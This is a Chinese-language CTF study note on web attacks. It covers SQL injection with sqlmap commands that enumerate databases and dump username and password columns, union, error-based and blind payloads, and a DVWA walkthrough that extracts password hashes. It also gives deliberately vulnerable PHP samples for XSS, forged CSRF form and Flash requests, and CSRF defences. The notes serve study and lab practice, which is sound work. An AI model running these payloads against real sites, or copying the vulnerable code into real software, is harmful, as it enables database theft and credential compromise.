# WEB篇

**tip:计算机网络常用端口汇总！总有你不知道的端口及对应的服务！**

| 端口 |                          服务及说明                          |
| :--: | :----------------------------------------------------------: |
|  20  |          ftp-data。FTP文件传输协议（默认数据端口）           |
|  21  |               ftp。FTP文件传输协议（控制端口）               |
|  22  |                     ssh。SSH远程登录协议                     |
|  23  |                Telnet。Telnet标准终端仿真协议                |
|  25  |             SMTP。简单邮件传输协议，用于发送邮件             |
|  37  |                        time。时间协议                        |
|  39  |                      rip。资源定位协议                       |
|  53  |                     domain。DNS域名服务                      |
|  80  |             HTTP。用于万维网服务的超文本传输协议             |
| 110  |              pop3。邮局协议版本3，用于接收邮件               |
| 161  |                   snmp。 简单网络管理协议                    |
| 443  | HTTPS。基于TLS/SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP |
| 3389 |         Windows2000（2003）server远程桌面的服务端口          |

[更多……](https://www.douban.com/note/568630865/?start=100)

## SQL注入

### 基本概念

+ SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
+ 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
+ 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。

![image-20210416171316396](CTF-WEB篇.assets/image-20210416171316396.png)

### 常用工具

+ sqlmap
+ ……

#### sqlmap工具

##### sqlmap简介

sqlmap支持五种不同的注入模式：

1. 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2. 基于时间的盲注，即不能根据页面的返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4. 联合查询注入，可以使用union的情况下的注入。
5. 堆查询注入，可以同时执行多条语句的执行时的注入。

##### sqlmap支持的数据库

`mysql、oracle、postgresql、Microsoft SQL server、Microsoft access、IBM DB2、sqlite、Firebird, Sybase和SAP MaxDB`

##### 检测注入

+ **基本格式**

~~~
get格式：
sqlmap -u "http://xxxx.xxx/index.php?id=x" 
默认使用level1检测全部数据库类型
sqlmap -u "http://xxx.xxx/index.php?id=x" --dbms mysql --level 3
指定数据库类型为mysql 级别为3（共5级，级别越高，检测越全面）
~~~

+ **跟随302跳转**

  当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，当注入错误的时候，先报错再跳转的时候，不需要跟随302。目的：要追踪到错误信息。

+ **cookie注入**

~~~
当程序有防止get注入的时候，可以使用cookie注入
sqlmap -u "http://xxx.xxx/index.php" --cookie  “id=11” –level 2（只有level达到2才会检测cookie）
~~~

+ **post数据包注入**

~~~
可以使用burpsuite工具抓取post数据包
sqlmap -r "post数据包存放路径" -p "注入参数"  
~~~

##### 注入成功后

+ **获取数据库基本信息**

~~~
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs
查询有哪些数据库
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables
查询test数据库中有哪些表
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns
查询test数据库中admin表有哪些字段
sqlmap -u "http://xxx.xxx/index.php?id=X" -D test -T admin -C "username,password" --dump
dump出字段username与password中的数据
~~~

+ **从数据库中搜索字段**

~~~
sqlmap -r "文件路径" -D "数据库名" --search -C admin,password 
在数据库中搜索字段admin与password
~~~

+ **读取与写入文件**

~~~
	首先需要找个网站的物理路径，其次需要有可写或可读的权限
	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件（物理路径）
	--file-wirte=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
	--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

~~~

##### sqlmap详细命令

+ **常用命令**

  + `--is-dba`:  当前用户权限（是否为root权限）
  + `--dbs`:   枚举所有数据库
  + `--current-db`:  显示网站当前数据库
  + `--users`:  枚举所有数据库用户
  + `--current-user`：显示当前数据库用户
  + `--random-agent`： 构造随机user-agent
  + `--passwords`： 显示数据库密码
  + `proxy http://xxx.xxx  --threads 10 `：(可以 自定义线程加速)代理
  + `--time-sec`: DBMS响应的延迟时间（默认为5秒）   

+ **options(选项)：**

  + `--version`：显示sqlmap的版本号

  + `-h、--help`：显示帮助信息

  + `-v `： VERBOSE 详细级别：0-6（默认为1）

  + ~~~
    保存进度继续跑：
    sqlmap -u "网址" --dbs-o "sqlmap.log"  保存进度
    sqlmap -u "网址"  --dbs-o "sqlmap.log"  --resume 恢复已保存进度
    
    ~~~

+ **Target(目标)：**

  以下至少需要设置其中一个选项，设置目标URL:

  + `-d`：直接连接到数据库
  + `-u`:  URL 连接目标 URL
  + `-l`:  LIST 从burpsuite或者WebScarab代理的日志中解析目标
  + `-r`:  REQUESTFILE  从一个文件中载入http请求
  + `-g`:  处理Google dork的结果作为目标URL
  + `-c`:  CONFIGFILE  从INI配置文件中加载选项

+ **Request（请求）**：

  这些选项可以用来指定如果连接到目标URL

  + `--data=DATA`:  通过post发送的数据字符串
  + `--cookie=COOKIE`:  http cookie头
  + `--cookie-urlencode`:  URL编码生成的cookie注入
  + `--drop-set-cookie`： 忽略响应的set-cookie头信息
  +  `--user-agent=AGENT`:  指定http User-Agent头
  + `--random-agent`： 使用随机选定的http user-agent头
  + `--referer=REFERER`：指定http Referer头
  + `--headers=HEADERS`:  换行分开，加入其他的http头
  + `--auth-type=ATYPE`:  http身份验证类型（基本、摘要或NTLM）
  + `--auth-cred=ACRED`:  http身份验证凭据
  + `--auth-cert=ACERT`:  http 认证证书
  + `--proxy=PROXY`:  使用http代理身份链接到目标URL
  + `--proxy-cred=PCRED`:  http代理身份验证凭据（用户名：密码）
  + `--ignore-proxy`：忽略系统默认的http代理
  + `--delay=DELAY`:  在每个http请求之间的延迟时间，单位为秒
  + `--timeout=TIMEOUT`:  等待连接超时的时间（默认为30秒）
  + `--retries=RETRIES` :  连接超时后重新连接的时间（默认为3秒）
  + `--scope=SCOPE`： 从所提供的代理日志中过滤目标的正则表达式
  + `--safe-url=SAFURL`:  在测试过程中经常访问的URL地址
  + `--safe-freq=SAFREQ` :  两次访问之间测试请求，给出安全的URL

+ **Enumeration（枚举）：**

  这些选项可以用来枚举后端数据库管理系统的信息、表中的结构以及数据。此外，也可以运行自己的sql语句。

  + `-b、--banner`:  检索数据库管理系统的标识
  + `--current-user`： 检索数据库管理系统当前用户
  + `--current-db`： 检索数据库管理系统当前数据库
  + `--is-dba`:  检测DBMS当前用户是否是root权限
  + `--users`:  枚举数据库管理系统所有用户
  + `--passwords`:  枚举数据库管理系统用户密码哈希值
  + `--privileges`:  枚举数据库管理系统用户的权限
  + `--roles`： 枚举数据库管理系统用户的角色
  + `--dbs`： 枚举数据库管理系统数据库
  + `-D `:  要进行枚举的指定数据库名
  + `-T`： 要进行枚举的指定数据库表名
  + `--tables`：枚举指定数据库中的表
  + `--columns`:  枚举指定表中的字段
  + `--dump`:  转储数据库管理系统的数据库中的表项
  + `--dump-all`:  转储所有的数据库表中的条目
  + `--search`： 搜索列，表或者数据库名称
  + `-C`： 要进行枚举的数据库列
  + `-U`:  用来进行枚举的数据库用户
  + `--exclude-sysdbs`:枚举表时排除系统数据库
  + `--sql-query`:  要执行的sql语句
  + `--sql-shell`:  提示交互式sql的shell

+ **Optimization(优化)：**

  这些选项可用于优化sqlmap的性能

  + `-o`： 开启所有的优化开关
  + `--predict-output`:  预测常见的查询输出
  + `--keep-alive`:  使用持久的http(s)连接
  + `--null-connection`:  从没有实际的http响应体中检索页面长度
  + `--threads`:  最大的http（s）请求并发量（默认为1）

+ **Injection（注入）**

  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本

  + `-p`:  可测试注入的参数
  + `--dbms`:  强制后端的DBMS为此值
  + `–os`:  强制后端的DBMS操作系统为这个值
  + `--prefix`： 注入payload字符串前缀
  + `--suffix`：   注入payload字符串后缀
  + `–tamper`：  使用给定的脚本（S）篡改注入数据

+ **Detection(检测)：**

  这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

  + `--level`： 执行测试的等级（1-5，默认为1）
  + `--risk`：执行测试的风险（0-3，默认为1）
  + `--string`:  查询时有效时在页面匹配字符串
  + `--regexp`:  查询时有效时在页面匹配正则表达式
  + `--text-only` :  仅基于在文本内容比较网页

+ **Techniques(技巧)：**

  这些选项可用于调整具体的SQL注入测试。

  + `--technique`:  sql注入技术测试（默认时BEUST）
  + `--time-sec`:  数据库管理系统响应的延迟时间（默认为5秒）
  + `--union-cols`:  定列范围用于测试union查询注入
  + `--union-char`:  用于暴力猜解列数的字符

+ **Fingerprint(指纹):**

  `-f, –fingerprint`:   执行检查广泛的DBMS版本指纹

  


### 手动注入基本步骤

```shell
判断是什么类型注入，有没有过滤关键字，是否能绕过
确定存在注入的表的列数以及表中数据那些字段可以显示出来
获取数据库版本，用户，当前连接的数据库等信息
获取数据库中所有表的信息
获取某个表的列字段信息
获取相应表的数据
```

### 注入类型

SQL注入分为很多种，有联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等等，这些注入所产生的的原理都是一样的。

#### 整数型注入

整数型注入就是输入的数据两边没有用引号或其他符号包起来，可以直接在输入的数据后面进行SQL语句的拼接,语句的最后不需要用 `# ` 或者 `--+`注释。

> 例如：
>
> 1  order by 3、1 union select 1,2,3

#### 字符型注入

字符型注入要考虑到引号闭合和注释

> 例如：
>
> 1' order by 3 # 或者 1' union select 1,2,3 #

#### 报错注入

+ 原理：构造 payload 让信息通过错误提示回显出来。

  

+ 平时我们最常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。

~~~sql
1. select count (*) from information _schema.tables group by concat ((此处加入执行语句),0x7e,floor (rand (0)*2));
2. extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));
3. select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);
~~~

[详细解释]([SQL 注入 报错注入 - Keefe's Blog | 每天都要热爱技术 -- 网络安全技术博客 (aiyuanzhen.com)](http://aiyuanzhen.com/index.php/archives/34/))

#### 布尔注入

+ 特点：当页面存在注入，但是没有显示位，且没有用echo "mysql_error()"输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
+ 利用方式：用and连接前后语句：`www.xxx.com/aa.php?id=1` and (注入语句) --+ 根据返回页面是否相同来得到数据
+ 布尔注入常用函数

~~~sql
length(str)：返回str字符串的长度。
substr(str, pos, len)：将str从pos位置开始截取len长度的字符进 行返回。注意这里的pos位置是从1开始的，不是数组的0开始
mid(str,pos,len):跟上面的一样，截取字符串
ascii(str)：返回字符串str的最左面字符的ASCII代码值。
ord(str):同上，返回ascii码
if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0
~~~



#### 二次注入

+ 第一步：插入恶意数据

  第一步进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

+ 第二步：引用恶意数据

  再将数据库存入到数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。

#### 盲注

盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称为盲注。盲注分为以下三类：

+ **基于布尔的SQL盲注--逻辑判断**

  regexp，like，asciI，left，ord,mid

+ **基于时间的SQL盲注--延时判断**

  if，sleep

+ **基于报错的SQL盲注--报错回显(优先使用)**

  floor，updatexml，extractvalue

### 常见注入函数（参数）

+ `user()`：当前数据库用户
+ `database()`: 当前数据库名
+ `version()`: 当前使用的数据库版本
+ `@@datadir()`:  数据库存储数据路径
+ `@@basedir  `  MYSQL获取安装路径
+ `concat()`:  联合数据，用于联合两条数据的结果。如`concat(username,0x3a,password)`
+ `concat_ws(0x3a,username,password)`:  用法类似
+ `mid(column_name,start[,length])`: 截取字符串
+ `substr(column_name,start[,length])`：参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。
+ `left(string, n )`：Left()得到字符串左部指定个数的字符
+ `ASCII(str) =ORD(str)`:  返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL
+ `hex() 、 unhex()`:  用于hex编码解码
+ `load_file()`:   以文本方式读取文件，在Windows中，路径设置为\\\
+ `group_concat()`：
+ `floor()`：返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分
+ `rand()`：可以用来生成0到1之间的随机数
+ `if(a,b,c)` :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

### 语法参考与小技巧

#### 参数类型

数字、字符、搜索、JSON等

#### 提交方式

POST、GET、Cookie、Request



#### 行内注释

==作用就是把后面的特殊符号给注释掉，避免语法错误==

+ `--`    

```
SELECT parentId,parentName FROM `parent` where parentId = '2016000011' UNION SELECT 1,DATABASE() -- '
```

==注：`--`符号之后要加一个空格==

+ `#`

```shell
 SELECT parentId,parentName FROM `parent` where parentId = '2016000011' UNION SELECT 1,DATABASE() #'
```

#### 利用information_schema数据库

+ 利用的前提是：首先应该知道database（）[也就是当前数据库的名字]
+ 在知道当前使用的数据库的名字之后，利用如下SQL语句进行查询

```shell
select 要查询的字段名 from 库名.表名 where 已经字段名字=已知条件的值
```

+ 因为mysql5.0以上版本自带数据库，information_schema库中记录着当前mysql中所有的数据库名、表名、列名等信息。下列是存放各信息的名字。

```
information_schema.schemata: 记录数据库信息的表
information_schema.tables: 记录表名信息的表
information_schema.columns: 记录列名信息的表
schema_name:  数据库名
table_name:  表名
column_name:  列名
table_schema:  数据库名
```

+ dvwa SQL注入实例**（联合注入）**

  > ==第一步==确定显示的列数，通过 `order by 或者union select 1,2···*`语句判断列数

  + 正确结果

  ![image-20210415173833139](CTF-WEB篇.assets/image-20210415173833139.png)

  + 错误结果

  ![image-20210415173957211](CTF-WEB篇.assets/image-20210415173957211.png)

  **或者直接就是不显示任何错误信息的反馈，也就是盲注**

  > ==第二步==确定所有的数据库或者当前数据库

  ~~~
  1. 'union select 1,database()#
  
  或者
  
  2.  'union select 1,schema_name from information_schema.schemata  #
  
  ~~~

  第一种结果：

![image-20210415213620616](CTF-WEB篇.assets/image-20210415213620616.png)

​		第二种结果：

​		![image-20210415213553524](CTF-WEB篇.assets/image-20210415213553524.png)

​	

> ==第三步==根据获取的数据库来确定当前数据库中所有的表

```
'union select 1,table_name from information_schema.tables where table_schema="dvwa"#
```

​		结果：获取了表的信息

![image-20210415214600606](CTF-WEB篇.assets/image-20210415214600606.png)

> ==第四步==根据获取的表来查看表中所含的字段信息

~~~
'union select 1,column_name from information_schema.columns where table_name="users"#
~~~

结果：获取了字段的信息

![image-20210415215042015](CTF-WEB篇.assets/image-20210415215042015.png)

> ==第五步==根据获取的字段信息去获取字段内容值

~~~
'union select 1, concat(user,0x3a,password) from users #
~~~

结果：获取了表中所有某些字段的内容。**注：0x3a代表的字符是冒号":"**

![image-20210415215546445](CTF-WEB篇.assets/image-20210415215546445.png)

最终获取了想要获得的用户账号密码，使用MD5撞库解密就可以了。



#### 文件读写操作

mysql数据库仅有的

`load_file()`：读取函数

`into outfile或者into dumpfile`：导出函数

+ 路径获取常见方法：

  报错显示、遗留文件、漏洞报错、平台配置文件、爆破等

+ 常见写入文件问题：魔术引号开关
  
  + magic_quotes_gpc



### waf绕过

![image-20210419140921905](CTF-WEB篇.assets/image-20210419140921905.png)

## 文件上传



>1. 什么是文件上传？
>2. 文件上传漏洞有哪些伤害？
>3. 文件上传漏洞如何查找及判断？
>4. 文件上传漏洞有哪些需要注意的地方？
>5. 关于文件上传漏洞在实际应用中的说明？

​		文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。**显然这种漏洞是getshell最快最直接的方法之一**，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。

##### 文件上传常见验证

+ 后缀名：类型、文件头等
+ 后缀名：黑名单、白名单
+ 文件类型：MIME信息
+ 文件头：内容头信息



## XSS跨站脚本攻击

![image-20210426163409777](CTF-WEB篇.assets/image-20210426163409777.png)

### XSS简介

>  跨站脚本（Cross-Site Script，XSS）是一种经常出现在WEB应用程序中的计算机安全漏洞，是由于WEB应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意脚本代码注入到网页中，当其他用户浏览这些网页是，就会执行其中的恶意代码，对受害用户可能采取cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。

### 反射型XSS

反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。

反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的  URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS  通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。

服务器端代码：

~~~php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 
?>
~~~

可以看到，代码直接引用了 `name` 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。

### 持久型XSS

持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。

此类 XSS 不需要用户单击特定 URL  就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS  一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

服务器端代码：

~~~php
<?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    //mysql_close(); }
?>
~~~

代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。

### DOM XSS





httponly



## CSRF

### CSRF简介

> CSRF，全名Cross Site Request Forgery，跨站请求伪造。很容易将它与XSS混淆，对于CSRF其两个关键点是**跨站点的请求**与**请求的伪造**，由于目标站**无token与referer防御**，导致用户的敏感操作的每一个参数都可以被攻击者获知，攻击者即可以伪造一个完全一样的请求以用户的身份达到恶意目的。

### CSRF类型

+ 按请求类型：`GET型`、`POST型`
+ 按攻击方式：`HTML CSRF`、`JSON HiJacking`、`Flash CSRF`等

#### HTML CSRF

利用HTML元素发出的CSRF请求，这是最常见的CSRF攻击。

HTML中可以设置`src/href`等链接地址的标签都可以发起一个GET请求，如：

~~~html
<link href="">
<img src="">
<img lowsrc="">
<img dynsrc="">
<meta http-equiv="refresh" content="0; url=">
<iframe src="">
<frame src="">
<script src=""></script>
<bgsound src=""></bgsound>
<embed src=""></bgsound>
<video src=""></video>
<audio src=""></audio>
<a href=""></a>
<table background=""></table>
......
~~~

还有 CSS 样式中的：

~~~css
@import ""
background:url("")
......
~~~

也可使用表单来对 POST 型的请求进行伪造:

~~~html
<form action="http://www.a.com/register" id="register" method="post">
  <input type=text name="username" value="" />
  <input type=password name="password" value="" />
</form>
<script>
  var f = document.getElementById("register");
  f.inputs[0].value = "test";
  f.inputs[1].value = "passwd";
  f.submit();
</script>
~~~

#### Flash CSRF

Flash 也有各种方式可以发起网络请求，包括POST:

~~~
import flash.net.URLRequest;
import flash.system.Security;
var url = new URLRequest("http://target/page");
var param = new URLVariables();
param = "test=123";
url.method = "POST";
url.data = param;
sendToURL(url);
stop();
~~~

Flash 中还可以使用 `getURL`、`loadVars` 等方式发起请求。

~~~
req = new LoadVars();
req.addRequestHeader("foo", "bar");
req.send("http://target/page?v1=123&v2=222", "_blank", "GET");
~~~

### CSRF的防御

#### 验证码

验证码强制用户必须与应用进行交互，才能完成最终请求。

#### Referer Check

检查请求是否来自合法的源，但服务器并非什么时候都能取得Referer。

#### Token

 CSRF能够攻击成功的本质原因是重要操作的所有参数都可以被攻击者猜测得到。

保持原参数不变，新增加一个参数Token，值是随机的，在实际应用中，Token可以放在用户的Session中，或者浏览器的Cookie中。

Token一定要足够随机。此外，Token的目的不是为了防止重复提交，所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗掉之前都使用同一个Token，但如果用户已经提交了表单，则这个Token已经消耗掉，应该重新生成Token。

Token还应注意其保密性，如果Token出现在url中，则可能会通过Referer泄露，应尽量把Token放在表单中，把敏感操作由GET改为POST，以表单或者AJAX的形式提交，避免Token泄露。